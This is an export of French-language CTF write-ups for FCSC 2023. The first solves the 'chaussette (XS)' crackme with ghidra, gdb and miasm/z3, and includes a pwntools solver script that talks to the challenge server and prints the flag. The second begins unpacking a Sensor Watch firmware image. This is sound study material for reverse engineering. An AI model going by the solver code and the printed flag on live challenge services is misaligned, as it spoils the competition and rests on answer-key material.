[{"content":"vous pouvez retrouver le binaire ici\nCe challenge est une version simplifiée d\u0026rsquo;un challenge nommé \u0026ldquo;chaussette\u0026rdquo;, durant la résolution de sa version compliquée j\u0026rsquo;ai appris à utiliser miasm, un framework de reverse engineering que j\u0026rsquo;ai trouvé très intéressant malgré le peu de documentation. J\u0026rsquo;ai donc décidé de proposer une solution utilisant miasm.\nDécouverte du challenge Pour ce challenge, un binaire nous est donné. La commande file permet d\u0026rsquo;en apprendre un peu plus à son sujet.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/chaussette-xs\r╰─➤ file chaussette-xs\rchaussette-xs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=913fe53d14998feda6a550d5a815830cf4ab132f, for GNU/Linux 3.2.0, stripped On apprend donc que l\u0026rsquo;on a un ELF x86-64. On va donc l\u0026rsquo;ouvrir dans ghidra afin d\u0026rsquo;avoir de comprendre ce qu\u0026rsquo;il fait plus précisemment.\nvoid FUN_00102140(undefined8 param_1,undefined8 param_2,undefined8 param_3) { undefined8 unaff_retaddr; undefined auStack_8 [8]; __libc_start_main(FUN_00102000,unaff_retaddr,\u0026amp;stack0x00000008,FUN_00103230,FUN_00103290,param_3, auStack_8); do { /* WARNING: Do nothing block with infinite loop */ } while( true ); } On regard donc le point d\u0026rsquo;entrée du binaire afin de trouver la fonction main de l\u0026rsquo;application.\nIci, l\u0026rsquo;appel à la fonction libc_start_main de la libc nous permet de récuperer notre fonction principale qui sera donc FUN_00102000 .\nOn va de suite la renommer afin d\u0026rsquo;y voir plus clair et de la retrouver plus facilement (clic droit sur la fonction -\u0026gt; Rename function).\nOn arrive donc sur le code principal de notre fonction qui est assez simple à comprendre.\nundefined8 main(void) { int iVar1; long lVar2; undefined8 *puVar3; ulong *puVar4; ulong uVar5; ulong *puVar6; undefined8 *puVar7; byte bVar8; ulong local_18; undefined8 local_10; bVar8 = 0; lVar2 = sysconf(0x1e); if (lVar2 == 0x1000) { puVar3 = (undefined8 *)mmap((void *)0x0,0x100000,7,0x22,-1,0); DAT_001061b0 = puVar3; *puVar3 = 0x1a22d2ea22d1b848; *(undefined8 *)((long)puVar3 + 0xf9) = 0xc3f83148b12e2565; lVar2 = (long)puVar3 - (long)(undefined8 *)((ulong)(puVar3 + 1) \u0026amp; 0xfffffffffffffff8); puVar7 = (undefined8 *)((long)\u0026amp;DAT_001060a0 - lVar2); puVar3 = (undefined8 *)((ulong)(puVar3 + 1) \u0026amp; 0xfffffffffffffff8); for (uVar5 = (ulong)((int)lVar2 + 0x101U \u0026gt;\u0026gt; 3); uVar5 != 0; uVar5 = uVar5 - 1) { *puVar3 = *puVar7; puVar7 = puVar7 + (ulong)bVar8 * -2 + 1; puVar3 = puVar3 + (ulong)bVar8 * -2 + 1; } __isoc99_scanf(\u0026amp;DAT_00104004,\u0026amp;local_18); __isoc99_scanf(\u0026amp;DAT_00104004,\u0026amp;local_10); lVar2 = (*(code *)DAT_001061b0)(local_18,local_10); if (lVar2 == 0) { iVar1 = mprotect(FUN_00103000,0x400,7); if (iVar1 != -1) { puVar4 = (ulong *)FUN_00103000; uVar5 = local_18; do { *puVar4 = *puVar4 ^ uVar5; puVar6 = puVar4 + -0x205ff; uVar5 = uVar5 * 0x5851f42d4c957f2d + 0x14057b7ef767814f; puVar4 = puVar4 + 1; } while (puVar6 \u0026lt; (ulong *)0x1f8); FUN_00103000(DAT_001061b0,local_18,local_10); } } } return 0; } Il va dans un premier temps allouer 0x100000 octets sur le tas avec les droits de lecture, d\u0026rsquo;écriture et d\u0026rsquo;execution grâce à la fonction mmap\nIl va ensuite effectuer certaines opérations afin d\u0026rsquo;écrire des données dans la mémoire allouée, on ne s\u0026rsquo;attardera pas dessus.\nPuis le programme va demander à l\u0026rsquo;utilisateur 2 entrées. Si l\u0026rsquo;on regard à l\u0026rsquo;addresse DAT_00104004 on peut voir qu\u0026rsquo;elle pointe vers la chaine de caractères : \u0026ldquo;%lu\u0026rdquo; ce qui signifie que la fonction scanf va demander à l\u0026rsquo;utilisateur 2 entiers non signés de 64 bytes.\nEnfin, il va appeler le code placé dans la mémoire allouée précedemment avec comme paramètres les 2 valeurs entrées par l\u0026rsquo;utilisateur.\nEn fonction du résultat de cette fonction il va continuer l\u0026rsquo;execution du programme ou non. On comprend donc rapidemment que notre première épreuve va être de trouver les entrées correctes afin que cette fonction retourne 0.\nA la suite de cette fonction, si les valeurs entrées sont correctes le binaire va appeler la fonction mprotect() afin d\u0026rsquo;ajouter les droits d\u0026rsquo;écriture sur la fonction FUN_00103000 et va ensuite modifier son contenu. Un fois le code de la fonction modifié, il va l\u0026rsquo;appeler comme argument l\u0026rsquo;addresse de notre mémoire précedemment allouée ainsi que nos 2 entrées utilisateur.\npremier shellcode La première étape de ce crackme va donc être de trouver les valeurs correcte afin que le code placé en mémoire retourne 0. On va donc utiliser un debugger afin de placer un point d\u0026rsquo;arrêt au moment de l\u0026rsquo;appel à la fonction et de récuperer son code.\nPour ma part j\u0026rsquo;utilise gdb.\nPetite astuce d\u0026rsquo;ailleurs si vous utilisez comme moi ghidra pour décompiler votre code et gdb pour debugger, vous pouvez changer la base address dans ghidra afin que vos addresses soit les mêmes entre ghidra et votre debugger. Il suffit d\u0026rsquo;aller dans Window -\u0026gt; Memory map ensuite vous cliqué sur la petite maison et changer l\u0026rsquo;addresse de la base du binaire.\non lance donc gdb, on place notre point d\u0026rsquo;arret et on lance notre binaire.\n(gdb) b*0x5555555560aa\rBreakpoint 1 at 0x5555555560aa\r(gdb) run\rStarting program: /home/user/shared/fcsc2023/reverse/chaussette-xs/chaussette-xs\r[Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/usr/lib/libthread_db.so.1\u0026#34;.\r123\r123\rBreakpoint 1, 0x00005555555560aa in ?? ()\r(gdb) x/i $rip\r=\u0026gt; 0x5555555560aa: call QWORD PTR [rip+0x4100] # 0x55555555a1b0 On peut voir qu\u0026rsquo;on est bel et bien arrété avant l\u0026rsquo;appel à la fonction.\nLa commande x/i address permet de décoder les opcodes présent à une addresse.\nOn va donc pouvoir afficher notre shellcode grâce à cette commande.\nAttention, ici le code ne se trouve pas à l\u0026rsquo;addresse mais à l\u0026rsquo;addresse pointée par celle ci.\n(gdb) x/gx 0x55555555a1b0\r0x55555555a1b0: 0x00007ffff7cc5000\r(gdb) x/100i 0x00007ffff7cc5000\r0x7ffff7cc5000: movabs rax,0x33a11a22d2ea22d1\r[...]\r0x7ffff7cc50ed: mul rdi\r0x7ffff7cc50f0: mov rdi,rax\r0x7ffff7cc50f3: movabs rax,0xb12e2565d1efe9f8\r0x7ffff7cc50fd: xor rax,rdi\r0x7ffff7cc5100: ret On a donc un joli code assembleur, maintenant il faut le résoudre. On remarque d\u0026rsquo;ailleurs qu\u0026rsquo;il utilise une seule des entrées utilisateur dans cette fonction. Ce sera de même tout le long du programme, la seconde entrée n\u0026rsquo;est pas utilisée.\nmovabs rax,0x33a11a22d2ea22d1 sub rdi,rax dec rdi movabs rax,0x94224bcad3296113 or rax,0x1 mul rdi mov rdi,rax dec rdi movabs rax,0xd3b1bf2d4d1d294a sub rdi,rax movabs rax,0xbe35746c05e956a9 add rdi,rax movabs rax,0x5819ea9fcbc8779 xor rdi,rax dec rdi movabs rax,0x7f7965e1baca6c8f sub rdi,rax neg rdi ror rdi,0xd movabs rax,0x4368955c512ca39b sub rdi,rax inc rdi neg rdi ror rdi,0x32 movabs rax,0x96ccb75bd569807d sub rdi,rax inc rdi movabs rax,0x9f40cb3b786d6842 or rax,0x1 mul rdi mov rdi,rax ror rdi,0x14 neg rdi neg rdi movabs rax,0x1fd3e4098240e723 add rdi,rax movabs rax,0xda3d1c27bae9522c sub rdi,rax rol rdi,0x36 inc rdi inc rdi dec rdi rol rdi,0x21 rol rdi,0x38 dec rdi neg rdi movabs rax,0xc88d84433f7b14e7 or rax,0x1 mul rdi mov rdi,rax movabs rax,0xb12e2565d1efe9f8 xor rax,rdi ret Il n\u0026rsquo;est pas très compliqué et aurait pu facilement être résolu à la main, néanmoins pour cette solution on utilisera miasm.\nOn va dump les octets de ce code dans un fichier, gdb nous permet de le faire grâce à sa commande dump\n(gdb) dump binary memory bytcodes_function 0x7ffff7cc5000 0x7ffff7cc5101 Je vous invite donc maintenant à installer miasm.\nRésolution avec Miasm Pour cette partie nous allons utiliser le framework miasm afin de résoudre ce code.\nVoici mon code permettant de trouver les entrées correctes à notre fonction. J\u0026rsquo;ai commenté le code au maximum, néanmoins je vais quand même vous résumer son fonctionnement afin d\u0026rsquo;être sur que tout le monde comprenne.\nLe programme va dans un premier temps lire les octets que l\u0026rsquo;on a dump précedemmemnt, les interpreter puis lancer une execution symbolique sur notre code. A la suite de cette exécution symbolique il va récuperer l\u0026rsquo;expression symbolique du registre RAX, qui est le registre qui contient notre valeur de retour et la transformer en contrainte compréhensible par z3. A partir de là on va simplifier cette expression et la résoudre.\nfrom miasm.analysis.machine import Machine from miasm.core.locationdb import LocationDB from miasm.analysis.binary import Container from miasm.expression.expression import * from miasm.ir.symbexec import SymbolicExecutionEngine from miasm.ir.translators.z3_ir import TranslatorZ3 from miasm.arch.x86.lifter_model_call import LifterModelCall_x86_64 from miasm.analysis.simplifier import * from miasm.expression.simplifications import expr_simp, ExpressionSimplifier from z3 import * import re def solve_shellcode(shellcode): # on créé une nouvelle location pour notre shellcode loc_db = LocationDB() # on load notre shellcode (nos bytes code) container = Container.from_string(shellcode, loc_db) machine = Machine(\u0026#39;x86_64\u0026#39;) ira = machine.lifter(loc_db) dis_engine = machine.dis_engine(container.bin_stream, loc_db=loc_db) start_addres = 0 # https://github.com/cea-sec/miasm/blob/master/doc/ir/lift.ipynb asm_cfg = dis_engine.dis_multiblock(start_addres) ira_cfg = ira.new_ircfg_from_asmcfg(asm_cfg) \u0026#34;\u0026#34;\u0026#34; # on peut utiliser ce bout de code pour afficher les instructions assembleurs. for block in asm_cfg.blocks: print(block) \u0026#34;\u0026#34;\u0026#34; init_state = {} # on definit ici RDI qui va contenir la valeur en entrée. init_state[ExprId(\u0026#34;RDI\u0026#34;, 64)] = ExprId(\u0026#39;input\u0026#39;, 64) # rax qui est censé être égal à 0 à la fin du script. init_state[ExprId(\u0026#34;RAX\u0026#34;, 64)] = ExprId(\u0026#39;result\u0026#39;, 64) # on lance l\u0026#39;execution symbolique. sb = SymbolicExecutionEngine(LifterModelCall_x86_64(loc_db) , state=init_state) sb.run_at(ira_cfg, addr=start_addres) # on va transformer l\u0026#39;expression symbolique en contraintes pour z3 trans = TranslatorZ3(loc_db=loc_db) # solveur basique z3 s = Solver() # on utilise miasm pour simplifier les expressions symboliques (on aurait pu faire sans pour ce chall) expr_simp_cond = ExpressionSimplifier() expr_simp_cond.enable_passes(ExpressionSimplifier.PASS_COND) # récuperer l\u0026#39;expression symbolique (+ la simplifiée.) expr_rax = sb.eval_expr(expr_simp(expr_simp_cond(ExprId(\u0026#39;RAX\u0026#39;, 64)))) # on solve avec z3 s.add(trans.from_expr(expr_rax) == trans.from_expr(ExprInt(0, 64))) if s.check() == sat: # print(\u0026#34;found\u0026#34;) model = s.model() # on retourne le resultat # (j\u0026#39;ai honte de mon parsing mais je n\u0026#39;arrivais pas récuperer cette valeur correctement ...) return int(re.findall(\u0026#34;[0-9]+\u0026#34;, str(model))[0]) else: print(\u0026#34;[-] fail\u0026#34;) return 0 # on ouvre le fichier contenant les octets de notre code assembleur with open(\u0026#34;bytcodes_function\u0026#34;, \u0026#34;rb\u0026#34;) as file: content = file.read() result = solve_shellcode(content) if result: print(f\u0026#34;[+] solution found : {result}\u0026#34;) On va donc executer notre programme et l\u0026rsquo;on récupère bel et bien une valeur.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/chaussette-xs\r╰─➤ python3 solve_first_shellcode.py\r[+] solution found : 14171339039947875846 On peut entrer ces valeurs dans notre binaire et effectivemment notre script passe la première condition avec succès !\nVous croyez que c\u0026rsquo;était fini ? c\u0026rsquo;est que le début. On passe donc à la deuxième fonction. Comme précédemment, on place notre breakpoint avant l\u0026rsquo;appel à la fonction et on l\u0026rsquo;affiche.\n(gdb) b*0x000055555555612c\rBreakpoint 1 at 0x55555555612c\r(gdb) run\rStarting program: /home/user/shared/fcsc2023/reverse/chaussette-xs/chaussette-xs\r[Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/usr/lib/libthread_db.so.1\u0026#34;.\r14171339039947875846\r123\rBreakpoint 1, 0x000055555555612c in ?? ()\r(gdb) x/i $rip\r=\u0026gt; 0x55555555612c: call 0x555555557000\r(gdb) x/110i 0x555555557000\r0x555555557000: movabs rax,0x676e656c6c616863\r0x55555555700a: push r15\r0x55555555700c: push r14\r0x55555555700e: push r13\r0x555555557010: push r12\r0x555555557012: push rbp\r0x555555557013: push rbx\r0x555555557014: mov rbx,rdi\r0x555555557017: lea rdi,[rip+0xfea] # 0x555555558008\r0x55555555701e: sub rsp,0x68\r0x555555557022: movdqa xmm0,XMMWORD PTR [rip+0xfe6] # 0x555555558010\r0x55555555702a: mov QWORD PTR [rsp+0x8],rsi\r0x55555555702f: movups XMMWORD PTR [rsp+0x30],xmm0\r0x555555557034: movdqa xmm0,XMMWORD PTR [rip+0xfe4] # 0x555555558020\r0x55555555703c: mov QWORD PTR [rsp],rdx\r0x555555557040: mov QWORD PTR [rsp+0x50],rax\r0x555555557045: mov DWORD PTR [rsp+0x58],0x72662e65\r0x55555555704d: mov BYTE PTR [rsp+0x5c],0x0\r0x555555557052: movups XMMWORD PTR [rsp+0x40],xmm0\r0x555555557057: call 0x5555555550a0 \u0026lt;getprotobyname@plt\u0026gt;\r0x55555555705c: test rax,rax\r0x55555555705f: je 0x5555555571bf\r0x555555557065: mov edx,DWORD PTR [rax+0x10]\r0x555555557068: mov esi,0x1\r0x55555555706d: mov edi,0x2\r0x555555557072: call 0x5555555550f0 \u0026lt;socket@plt\u0026gt;\r0x555555557077: mov DWORD PTR [rip+0x313b],eax # 0x55555555a1b8\r0x55555555707d: cmp eax,0xffffffff\r0x555555557080: je 0x5555555571bf\r0x555555557086: lea rdi,[rsp+0x30]\r0x55555555708b: call 0x555555555090 \u0026lt;gethostbyname@plt\u0026gt;\r0x555555557090: test rax,rax\r0x555555557093: je 0x5555555571bf\r0x555555557099: mov rax,QWORD PTR [rax+0x18]\r0x55555555709d: mov rax,QWORD PTR [rax]\r0x5555555570a0: mov edi,DWORD PTR [rax]\r0x5555555570a2: call 0x555555555050 \u0026lt;inet_ntoa@plt\u0026gt;\r0x5555555570a7: mov rdi,rax\r0x5555555570aa: call 0x555555555080 \u0026lt;inet_addr@plt\u0026gt;\r0x5555555570af: cmp eax,0xffffffff\r0x5555555570b2: je 0x5555555571bf\r0x5555555570b8: mov edi,DWORD PTR [rip+0x30fa] # 0x55555555a1b8\r0x5555555570be: lea rsi,[rsp+0x20]\r0x5555555570c3: mov DWORD PTR [rsp+0x24],eax\r0x5555555570c7: mov edx,0x10\r0x5555555570cc: mov DWORD PTR [rsp+0x20],0xcd080002\r0x5555555570d4: call 0x5555555550e0 \u0026lt;connect@plt\u0026gt;\r0x5555555570d9: cmp eax,0xffffffff\r0x5555555570dc: je 0x5555555571bf\r0x5555555570e2: lea r12,[rsp+0x18]\r0x5555555570e7: lea r13,[rsp+0x10]\r0x5555555570ec: lea r14,[rsp+0x8]\r0x5555555570f1: nop DWORD PTR [rax+0x0]\r0x5555555570f8: mov rax,QWORD PTR [rsp+0x8]\r0x5555555570fd: mov edi,DWORD PTR [rip+0x30b5] # 0x55555555a1b8\r0x555555557103: mov edx,0x8\r0x555555557108: mov rsi,r12\r0x55555555710b: mov QWORD PTR [rsp+0x18],rax\r0x555555557110: call 0x555555555040 \u0026lt;write@plt\u0026gt;\r0x555555557115: mov rax,QWORD PTR [rsp]\r0x555555557119: mov edx,0x8\r0x55555555711e: mov rsi,r12\r0x555555557121: mov edi,DWORD PTR [rip+0x3091] # 0x55555555a1b8\r0x555555557127: mov QWORD PTR [rsp+0x18],rax\r0x55555555712c: call 0x555555555040 \u0026lt;write@plt\u0026gt;\r0x555555557131: mov edi,DWORD PTR [rip+0x3081] # 0x55555555a1b8\r0x555555557137: mov edx,0x8\r0x55555555713c: mov rsi,r13\r0x55555555713f: call 0x555555555070 \u0026lt;read@plt\u0026gt;\r0x555555557144: mov rbp,QWORD PTR [rsp+0x10]\r0x555555557149: cmp rbp,0xffffffffffffffff\r0x55555555714d: je 0x5555555571ce\r0x55555555714f: mov r15,rbx\r0x555555557152: test rbp,rbp\r0x555555557155: jne 0x55555555716e\r0x555555557157: jmp 0x555555557189\r0x555555557159: nop DWORD PTR [rax+0x0]\r0x555555557160: add r15,rax\r0x555555557163: mov rax,r15\r0x555555557166: sub rax,rbx\r0x555555557169: cmp rax,rbp\r0x55555555716c: jae 0x555555557189\r0x55555555716e: mov edi,DWORD PTR [rip+0x3044] # 0x55555555a1b8\r0x555555557174: xor ecx,ecx\r0x555555557176: mov edx,0x1000\r0x55555555717b: mov rsi,r15\r0x55555555717e: call 0x555555555030 \u0026lt;recv@plt\u0026gt;\r0x555555557183: cmp rax,0xffffffffffffffff\r0x555555557187: jne 0x555555557160\r0x555555557189: mov rsi,r14\r0x55555555718c: lea rdi,[rip+0xe71] # 0x555555558004\r0x555555557193: xor eax,eax\r0x555555557195: call 0x5555555550d0 \u0026lt;__isoc99_scanf@plt\u0026gt;\r0x55555555719a: mov rsi,rsp\r0x55555555719d: lea rdi,[rip+0xe60] # 0x555555558004\r0x5555555571a4: xor eax,eax\r0x5555555571a6: call 0x5555555550d0 \u0026lt;__isoc99_scanf@plt\u0026gt;\r0x5555555571ab: mov rsi,QWORD PTR [rsp]\r0x5555555571af: mov rdi,QWORD PTR [rsp+0x8]\r0x5555555571b4: call rbx\r0x5555555571b6: test rax,rax\r0x5555555571b9: je 0x5555555570f8\r0x5555555571bf: add rsp,0x68\r0x5555555571c3: pop rbx\r0x5555555571c4: pop rbp\r0x5555555571c5: pop r12\r0x5555555571c7: pop r13\r0x5555555571c9: pop r14\r0x5555555571cb: pop r15\r0x5555555571cd: ret cette fonction peut paraître effrayante aux premiers abords, mais elle est en réalité plutôt simple. On peut d\u0026rsquo;abord voir les appels aux fonctions de la libc tels que socket, connect, recv etc.\nElle va établir une connexion tcp avec un serveur distant, lui envoyer nos 2 valeurs entrées précédemment et récuperer des données que le serveur lui envoie. Les octets que la fonction récupère vont être placés à l\u0026rsquo;addresse de notre précédente fonction. Ensuite le programme va demander à nouveau 2 entrées à l\u0026rsquo;utilisateur et appeler notre nouvelle fonction avec les valeurs données par l\u0026rsquo;utlisateur et recommencer.\nOn pourrait représenter le fonctionnement de cette fonction par le pseudo code suivant :\nvoid strange_function(char* shellcode, ulong value1, ulong value2) { conn = connexion(); // établit une connexion tcp avec le serveur while (1) { size = read(conn, 8); // lit 8 octets qui seront la taille du shellcode *shellcode = recv(conn) // reçois le shellcode et l\u0026#39;écris à // l\u0026#39;addresse de l\u0026#39;ancien shellcode // récupère les 2 entrées utilisateur scanf(\u0026#34;%lu\u0026#34;, \u0026amp;value1); scanf(\u0026#34;%lu\u0026#34;, \u0026amp;value2); // verifie que les entrées résolve le shellcode. // pareil que la première partie du challenge. if ((*(void(*)())shellcode)(value1, value2) != 0) { // signifie que notre entrée est fausse // le programme se stoppe. (et donc par conséquent pas de flag) return; } } } On va donc récuperer l\u0026rsquo;IP et le port afin de créer nous même la connexion tcp avec le serveur distant, lui envoyer nos valeurs et récuperer les shellcodes.\nPour récuperer l\u0026rsquo;ip et le port on pourrait placer un point d\u0026rsquo;arret au niveau de l\u0026rsquo;appel à la fonction getprotobyname et au niveau de la fonction socket . Mais étant flemmard (ou malin à vous de me dire) j\u0026rsquo;ai préféré regarder les connexions ouvertes sur ma machine par le processus en question.\nPour ce faire j\u0026rsquo;ai utilisé l\u0026rsquo;outil ss. J\u0026rsquo;execute donc mon binaire, je lui donne les valeurs trouvé précedemment afin qu\u0026rsquo;il établisse la connexion et ensuite avec la commande ss -nap | grep chaussette-xs je récupère l\u0026rsquo;ip et le port.\nLe serveur distant se trouve donc en 51.254.115.216:2253.\nRésoudre les shellcode avec miasm Après quelques tests on s\u0026rsquo;aperçoit qu\u0026rsquo;a chaque connexion le code renvoyé par le serveur change. On va donc implémenter un algorithme qui resout les fonctions donnée par le serveur distant.\nHeureusement nous avons déjà fait une grande partie du travail, en effet nous avons implémenté durant la première partie une fonction qui utilise miasm afin de résoudre les shellcodes. Nous avons donc a configurer la connexion avec le serveur et ensuite résoudre les instructions que le serveur nous enverra.\nVoici mon code :\nfrom pwn import * from miasm.analysis.machine import Machine from miasm.core.locationdb import LocationDB from miasm.analysis.binary import Container from miasm.expression.expression import * from miasm.ir.symbexec import SymbolicExecutionEngine from miasm.ir.translators.z3_ir import TranslatorZ3 from miasm.arch.x86.lifter_model_call import LifterModelCall_x86_64 from miasm.analysis.simplifier import * from miasm.expression.simplifications import expr_simp, ExpressionSimplifier from z3 import * import re def solve_shellcode(shellcode): # on créé une nouvelle location pour notre shellcode loc_db = LocationDB() # on load notre shellcode container = Container.from_string(shellcode, loc_db) machine = Machine(\u0026#39;x86_64\u0026#39;) ira = machine.lifter(loc_db) dis_engine = machine.dis_engine(container.bin_stream, loc_db=loc_db) start_addres = 0 # https://github.com/cea-sec/miasm/blob/master/doc/ir/lift.ipynb asm_cfg = dis_engine.dis_multiblock(start_addres) ira_cfg = ira.new_ircfg_from_asmcfg(asm_cfg) \u0026#34;\u0026#34;\u0026#34; # on peut utiliser ce bout de code pour afficher les instructions assembleurs. for block in asm_cfg.blocks: print(block) \u0026#34;\u0026#34;\u0026#34; init_state = {} # on definit ici RDI qui va contenir la valeur en entrée. init_state[ExprId(\u0026#34;RDI\u0026#34;, 64)] = ExprId(\u0026#39;input\u0026#39;, 64) # rax qui est censé être égal à 0 à la fin du script. init_state[ExprId(\u0026#34;RAX\u0026#34;, 64)] = ExprId(\u0026#39;result\u0026#39;, 64) # on lance l\u0026#39;execution symbolique. sb = SymbolicExecutionEngine(LifterModelCall_x86_64(loc_db) , state=init_state) sb.run_at(ira_cfg, addr=start_addres) # on va transformer l\u0026#39;expression symbolique en contraintes pour z3 trans = TranslatorZ3(loc_db=loc_db) # solveur basique z3 s = Solver() # on utilise miasm pour simplifier les expressions symboliques (on aurait pu faire sans pour ce chall) expr_simp_cond = ExpressionSimplifier() expr_simp_cond.enable_passes(ExpressionSimplifier.PASS_COND) # récuperer l\u0026#39;expression symbolique (+ la simplifiée.) expr_rax = sb.eval_expr(expr_simp(expr_simp_cond(ExprId(\u0026#39;RAX\u0026#39;, 64)))) # on solve avec z3 s.add(trans.from_expr(expr_rax) == trans.from_expr(ExprInt(0, 64))) if s.check() == sat: # print(\u0026#34;found\u0026#34;) model = s.model() return int(re.findall(\u0026#34;[0-9]+\u0026#34;, str(model))[0]) else: print(\u0026#34;[-] fail\u0026#34;) print(shellcode) return 0 # j\u0026#39;ai placé mon breakpoint au final, je trouvai un hostname plus joli host = \u0026#34;challenges.france-cybersecurity-challenge.fr\u0026#34; port = 2253 data_1 = 14171339039947875846 data_2 = 0xdeadbeef # useless # on etablit la connection tcp. p = remote(host, port) compteur = 0 while 1: # on envoie notre solution ainsi que celle inutile pour ce challenge. p.send(data_1.to_bytes(8, \u0026#34;little\u0026#34;)) p.send(data_2.to_bytes(8, \u0026#34;little\u0026#34;)) size = int.from_bytes(p.recv(8), \u0026#34;little\u0026#34;) shellcode = b\u0026#34;\u0026#34; print(f\u0026#34;[~] shellcode of {size} bytes\u0026#34;) shellcode = p.recv(size) flag = re.findall(b\u0026#34;FCSC{.*}\u0026#34;, shellcode) if flag: print(\u0026#34;flag is : \u0026#34;, end=\u0026#34;\u0026#34;) print(flag[0].decode()) exit() print(f\u0026#34;[~] solving shellcode {compteur}...\u0026#34;) result = solve_shellcode(shellcode) if result: data_1 = result print(f\u0026#34;[+] solution found : {data_1}\u0026#34;) compteur += 1 else: exit(1) # on ferme la connection p.close() Ce code va établir une connexion avec le serveur et tant qu\u0026rsquo;il ne trouve pas le flag dans les fonctions qu\u0026rsquo;il reçoit il va les résoudre et renvoyer la solution. Je ne pense pas qu\u0026rsquo;il est nécessaire que j\u0026rsquo;explique mon script en détail, il est très similaire au précédent.\nOn execute donc le script et au bout de quelques secondes le flag apparait.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/chaussette-xs\r╰─➤ python3 solving_using_miasm.py\r[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2253: Done\r[~] shellcode of 414 bytes\r[~] solving shellcode 0...\r[+] solution found : 16584048833465228239\r[~] shellcode of 444 bytes\r[~] solving shellcode 1...\r[+] solution found : 5460636808995531285\r[~] shellcode of 842 bytes\r[~] solving shellcode 2...\r[+] solution found : 3445377768356975671\r[~] shellcode of 810 bytes\r[~] solving shellcode 3...\r[+] solution found : 6412023629681526002\r[~] shellcode of 929 bytes\r[~] solving shellcode 4...\r[+] solution found : 1172201077721270149\r[~] shellcode of 18446744073709551615 bytes\rflag is : FCSC{2a86d6edc5d08afc03d2c9ef3e2ff83cd63e520ffbd716d96479df8147e6da5e}\r[*] Closed connection to challenges.france-cybersecurity-challenge.fr port 2253 Pour conclure J\u0026rsquo;ai trouvé ce challenge très intéressant, j\u0026rsquo;ai malheureusement été bloqué par son grand frère durant plusieurs jours sans le réussir. Il m\u0026rsquo;a néanmoins appris beaucoup de choses sur l\u0026rsquo;automatisation de l\u0026rsquo;analyse binaire. En effet j\u0026rsquo;ai toujours cru que les outils tels que angr, miasm et tout les solveurs de ce genre était pour les personnes qui ne voulaient pas réfléchir. C\u0026rsquo;était donc la première fois que j\u0026rsquo;utilisais miasm (et angr) et j\u0026rsquo;ai trouvé ça très intéressant. Cela m\u0026rsquo;a permis d\u0026rsquo;aborder un nouvel aspect du reverse engineering qui m\u0026rsquo;a l\u0026rsquo;air très complexe mais également très intéressant.\n","permalink":"https://trikkss.github.io/posts/fcsc2023_chaussette-xs/","summary":"Write up du challenge chaussette (XS).","title":"FCSC 2023 - chaussette (XS)"},{"content":"vous pouvez retrouver les fichiers joint avec le chall ici\nDécouverte du challenge Pour ce challenge 2 fichiers nous ont été donnés, un dossier compressé contenant un emulateur ainsi qu\u0026rsquo;un dump de la flash d\u0026rsquo;une montre.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ file watch.uf2\rwatch.uf2: UF2 firmware image, file size 00000000, address 0x002000, 360 total blocks après quelques recherches sur le format de fichier on comprend que c\u0026rsquo;est un format dévellopé par microsoft afin de flasher des micro controleur\ngithub.com/microsoft/uf2 on trouve sur ce même github un script python permettant packer et à la fois d\u0026rsquo;unpacker des fichiers UF2.\nuf2/uf2conv.md on va donc télécharger ce script et extraire le firmware.\nwget https://github.com/microsoft/uf2/raw/master/utils/uf2conv.py\rwget https://github.com/microsoft/uf2/raw/master/utils/uf2families.json Une fois téléchargé on va pouvoir récuperer notre firmware avec la commande :\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ python3 uf2conv.py watch.uf2 --convert --output firmware.bin 1 ↵\r--- UF2 File Header Info ---\rAll block flag values consistent, 0x0000\r----------------------------\rConverted to bin, output size: 92160, start address: 0x2000\rWrote 92160 bytes to firmware.bin Dans l\u0026rsquo;archive \u0026ldquo;émulateur\u0026rdquo;, on peut trouver un docker contenant un fichier web-assembly qui semble émuler notre montre.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ tar -xvf emulateur.tar.gz\remulateur/\remulateur/src/\remulateur/src/favicon.ico\remulateur/src/watch.html\remulateur/src/watch.js\remulateur/src/watch.wasm\remulateur/docker-compose.yml\remulateur/Dockerfile\remulateur/README.md On peut lancer l\u0026rsquo;émulateur avec la commande docker-compose up et se rendre sur la page http://localhost:8000/watch.html\nOn joue un peu avec l\u0026rsquo;émulateur et on tombe rapidemment sur une interface \u0026ldquo;PIN\u0026rdquo; qui semble prendre en entrée un code PIN en incrémentant les chiffres présents sur le cadran de la montre.\nSi l\u0026rsquo;on tente de rentrer un mot de passe la montre nous répond \u0026ldquo;BADPIN\u0026rdquo;\nSensor Watch Après quelques recherches sur le modèle de la montre CASIO F-91W, un nom revient très souvent : celui de Joey Castillo.\nEn effet je tombe sur un github intéressant : GitHub - joeycastillo/Sensor-Watch\nJe n\u0026rsquo;ai pas remarqué de suite, mais ce github porte le nom du challenge ! On est donc sur la bonne voie.\nEn parcourant le github on comprend que la Sensor Watch est une carte de remplacement pour la montre Casio F-91W sur laquelle on peut intégrer en quelque sorte des mods etc.\nOn peut d\u0026rsquo;ailleurs y retrouver notre émulateur quand on jette un oeil au framework Movement.\nOn a le code source du framework utilisé !\nOn peut donc maintenant passer au passer au reverse engineering de notre montre.\nReverse engineering Afin de decompiler le firmware je vais utiliser le framework ghidra.\nOn peut lire sur le github de la sensor watch :\nARM Cortex M0+ microcontroller Afin d\u0026rsquo;en savoir plus on cherche la datasheet du micro controleur. https://www.st.com/resource/en/datasheet/stm32g081rb.pdf\nOn est donc sur de l\u0026rsquo;ARM compilé en 32 bits.\nl\u0026rsquo;outil binbloom peut lui aussi nous donner des informations à propos du firmware.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ binbloom -a 32 firmware.bin 255 ↵\r[i] 32-bit architecture selected.\r[i] File read (92160 bytes)\r[i] Endianness is LE\r[i] 143 strings indexed\r[i] Found 580 base addresses to test\r[i] Base address found (valid array): 0x00002000.\rMore base addresses to consider (just in case):\r0x1ffeb000 